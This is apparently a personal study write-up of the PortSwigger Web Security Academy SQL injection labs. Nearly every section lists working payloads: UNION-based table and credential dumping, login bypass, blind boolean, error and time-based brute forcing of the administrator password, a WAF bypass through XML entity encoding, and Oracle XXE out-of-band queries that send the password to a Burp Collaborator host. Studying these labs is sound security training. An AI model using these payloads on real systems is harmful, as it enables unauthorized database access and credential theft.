# SQL Injection Notes

This will be the start of the SQL injection notes from the portswigger web security academy. I will just be listing walkthroughs and methodologies from the labs. Read the material for background information or watch.

Tips for exam: If 'Advanced Search' is used privilege escalation will be easy. 

[Portswigger](https://portswigger.net/web-security/sql-injection)

### Cheat sheet
[cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Injection points to consider:

- search parameters
- cookie values
- url parameters

### UNION Methodology

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
Oracle:
' UNION SELECT NULL FROM DUAL--
MySQl or Microsoft:
' UNION SELECT NULL#
' UNION SELECT NULL,NULL#
Check if text in columns:
' UNION SELECT 'abc',NULL--
' UNION SELECT NULL,'abc'--
```

## Checking for tables

```
Oracle:
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

Microsoft:
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

PostgreSQL:
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

MySQL:
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

# Labs walkthrough sections

## UNIONS

### SQLi vulnerability in WHERE clause allowing retrieval of hidden data

When selecting a refined search category like `Gifts` one can see the value in the URL set as Gifts. Adding the below  payload let's us view all products even unreleased ones.  

```
' or 1=1--
```

![image](https://github.com/user-attachments/assets/2d0bf1ab-78c8-480f-8f95-c2906d9fd7fe)

### SQL injection vulnerability allowing login bypass

Go to `my account` and enter arbirtraty login values with burp intercept on, then change the url value with: `administrator'--`

![image](https://github.com/user-attachments/assets/8ed32490-050b-4102-bfd7-5b397c7eecb6)


### SQL injection attack, querying the database type and version on Oracle

So first methodology for UNION attacks, in Oracle based on the Cheatsheet we see that every Oracle db needs a table to select from. We will always need a table to call to in Oracle, so in this case let's start with adding FROM dual in our query at the end. All of these injections are placed in the same as above, in the categories filter.

So it would look like

```
' UNION SELECT NULL FROM DUAL--
```

Just add Null's until we identify the length of columns. We find that 2 no longer gives us internal server errors. So now we are going to check for text by just adding random strings to the columns where the NULLS are like: "abc" 

```
' UNION SELECT 'abc', NULL FROM DUAL--
' UNION SELECT 'abc', 'abc' FROM DUAL--
```

We see both columns contain text values, so now the end challenge is to display the version of Oracle. Which you call by doing `SELECT BANNER FROM v$version`

```
' UNION SELECT BANNER, NULL FROM v$version--
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft

Similar methodology steps as the above UNION for Oracle but with # as the comment, we stop at 2 but add additional NULLs if you still get 500 internal errors

```
' UNION SELECT NULL#
' UNION SELECT NULL,NULL#
```

To check for text in columns

```
' UNION SELECT 'abc',NULL#
' UNION SELECT NULL,'abc'#
```


To solve just add @@version to the columns above

```
' UNION SELECT NULL,NULL#
```

### SQL injection attack, listing the database contents on non-Oracle databases

Follow the same UNION strategy as above

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 'abc',NULL--
' UNION SELECT NULL,'abc'--
```

Then we need to pull data on the tables in the db

```
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

Use the table you can deduce contains user creds

```
' UNION SELECT column_name, NULL FROM information_schema.tables WHERE table_name='users_abcdef'--
```

Then pull out the administrator pass with this:

```
' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
```

### SQL injection attack, listing the database contents on Oracle

Follow same UNION steps, we are going to assume 2 columns from here instead of repeating the same as above

```
' UNION SELECT 'abc', 'abc' FROM DUAL--
Retrieve tables:
' UNION SELECT table_name, NULL FROM all_tables--
Find columns on table:
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='users_abcdef'--
Get Admins password:
' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
```

### SQL injection UNION attack, determining the number of columns returned by the query

We've gone over this already many times

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

### SQL injection UNION attack, finding a column containing text

```
' UNION SELECT 'abc',NULL--
' UNION SELECT NULL,'abc'--
```

### SQL injection UNION attack, retrieving data from other tables

Checking same UNION and columns holding text methodology

```
' UNION SELECT 'abc','abc'--
```

Pull data out

```
' UNION SELECT username, password FROM users--
```

### SQL injection UNION attack, retrieving multiple values in a single column

We can concatenate two values into one to pull from a single column. More concatentation syntax exists in the cheat sheet.

```
' UNION SELECT NULL, username||'~'||password FROM users--
```

## Blind

### Blind SQL injection with conditional responses

There exists a TrackingId cokie value when visiting the site. 
- When we go to the site we see a `Welcome back` message in the website.
- If we add `' AND '1'='1` to the cookie we still see this message still.
- Now place `' AND '1'='2` and notice we don't get a message back, this means we can craft to identify values in the db
- Now we use this query `' AND (SELECT 'a' FROM users LIMIT 1)='a`
- This confirms that there is a users table
- Now we can use this query to identify that the administrator exists `' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
- Verifying password length: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
- Continuing to find password length `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a` increase this until we get a response without the message back
- Now send it to intruder and do this, fuzzing the a so we can find what the first letter of the password is `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
- Now we just change the first integer in the password section like this: `' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§`
- test these offsets until you get to the end of the password and you will have one

### Blind SQL injection with conditional errors

Same injection point within the TrackingId cookie. 

Steps to follow:
- inject `'` into the cookie value, notice an internal server error
- inject `''` and notice no errors, we can deduce based on conditional errors for our usecase. In this example this is an Oracle DB so make sure to add the FROM DUAL for all queries
- inject `'||(SELECT '')||'` and notice the error, again use FROM DUAL to get no errors, meaning our syntax is correct: `'||(SELECT '' FROM DUAL)||'`
- use users table name to see if that exists, if you get an error you know it doesn't. You have to do something like this: `'||(SELECT '' FROM users where rownum = 1)||'`, `where rownum =1` makes sure we don't break the concatentation and limits the response to 1 row.
- from the cheat sheet we use this: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)||'` and `'||(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)||'`, notice errors happen with one instead of the other
- The we do this to determine the length of the password value for the administrator account `'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`, incrementally change the `>1` number until you don't get an error anymore
- We then send with a crafted payload as such: `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
- we can put this in intruder and do an alphanumeric brute force on the `'a'` value, the response that gives a 500 error will be the value of that row in the password.
- To continue we just change the `SUBSTR(password,1,1)='a'` to `SUBSTR(password,2,1)='a'` to be able to get the second character in the administrators password, and keep incrementing and brute forcing this until we finish

### Visible error-based SQL injection

Same injection point in the cookie

- enter `'`
- then `'--` and notice no errors, so we should end it with a comment
- then `' AND CAST((SELECT 1) AS int)--`, then we get an error saying AND statement condition must be a boolean expression
- we can add this: `' AND 1=CAST((SELECT 1) AS int)--` and we see no error
- now we try to attempt pulling usernames `' AND 1=CAST((SELECT username FROM users) AS int)--`, our data is having issues, most likely a buffer issue so remove all the previous stuff on the cookie value to fit your query. Attempt again, and notice no issues
- then we send this: `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` and we get an error about casting administrator as an int
- then we can do the same to pull out the password: `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

### Blind SQL injection with time delays

Place a sleep call into your injection
`'||pg_sleep(10)--`

### Blind SQL injection with time delays and information retrieval

now we add a condition to trigger the sleep 
- `';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`, verify 10 seconds happen
- `';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--`, now verify it doesn't trigger, now we have our conditional syntax created
- `';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` pull if there is an administrator user in the users table
- `';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` get length of password for administrator, increase the 1 incrementally until you get a sleep
- `';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` now we will do the brute force on password value here
- for the above to work in intruder, go to Resource pool tab and change maximum concurrent requests to 1

### Blind SQL injection with out-of-band interaction

Injection: `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`

### Blind SQL injection with out-of-band data exfiltration

Pulling data out with concatenating it and putting it in as a subdomain to our collaborator:
`' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`

### SQL injection with filter bypass via XML encoding

This time we notice that the stock check feature sends the productId and storeId to the pplication in XML format. 
- send the `POST /product/stock` to repeater
- see if input is evaluated, enter this in the body: `<storeId>1+1</storeId>` if it does the math our data is being evaluated
- now we can use a UNION attack to pull data out: `<storeId>1 UNION SELECT NULL</storeId>` we got blocked due to being flagged as a potential attack
- To bypass the waf we can use the Hackvertor extension to encode our input: `Extensions > Hackvertor > Encode > dec_entities/hex_entities`
- Resend and notice now we are no longer blocked
- Now send this: `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
